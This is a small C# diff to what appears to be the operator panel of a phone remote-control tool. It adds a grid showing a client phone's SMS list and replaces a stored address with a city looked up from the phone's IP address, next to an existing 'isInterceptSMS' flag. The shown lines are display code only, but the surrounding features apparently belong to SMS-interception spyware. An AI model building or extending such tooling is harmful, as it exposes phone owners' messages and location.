@@ -108,6 +108,8 @@ namespace ClientCtrl
                 clientInfo.ipAddress = clientipe.Address.ToString();
                 UIAppList.updataPhoneInfo(this.listBox_phone_info, clientInfo);
 
+                UIAppList.updataSmsList(this.dataGridView_sms, clientInfo.smsList);
+
                 return;
             }
             //接受的是图片
@@ -139,9 +141,9 @@ namespace ClientCtrl
                 this.dataGridView1.Rows[index].Cells[2].Value = clientInfo.phoneModle;
                 this.dataGridView1.Rows[index].Cells[3].Value = true;
                 this.dataGridView1.Rows[index].Cells[4].Value = clientInfo.isInterceptSMS;
-                this.dataGridView1.Rows[index].Cells[5].Value = clientInfo.address;
+                this.dataGridView1.Rows[index].Cells[5].Value = AllUtils.getIpsCity(clientInfo.ipAddress);
             }
-          //  this.dataGridView1.DataSource = hashTableSocket;
+            //  this.dataGridView1.DataSource = hashTableSocket;
 
         }
 
